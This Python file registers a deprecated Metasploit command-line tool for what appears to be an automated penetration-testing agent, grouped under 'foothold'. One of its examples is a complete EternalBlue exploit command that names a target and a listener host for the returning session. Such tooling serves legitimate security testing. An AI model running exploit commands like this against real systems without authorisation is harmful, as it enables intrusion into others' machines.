from tools.registry import register
from tools.base import Tool, Param

def msf_command(a: dict) -> list[str]:
    return ["msfconsole", "-q", "-x", a["commands"]]

metasploit_legacy = register(Tool(
    name="metasploit",
    description=(
        "[LEGACY/DEPRECATED] Execute Metasploit Framework (msfconsole) commands via CLI. "
        "Prefer msf_search, msf_exploit, and msf_sessions instead — they use the RPC API "
        "and are faster, structured, and don't lose sessions on exit. "
        "Only use this tool if the RPC connection is unavailable."
    ),
    params=[
        Param("commands", "string", "A string of msfconsole commands separated by semicolons."),
    ],
    build_command=msf_command,
    category=["foothold"],
    examples=[
        "search type:exploit name:eternalblue; exit",
        "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.5; set LHOST 192.168.1.10; exploit; exit"
    ]
))
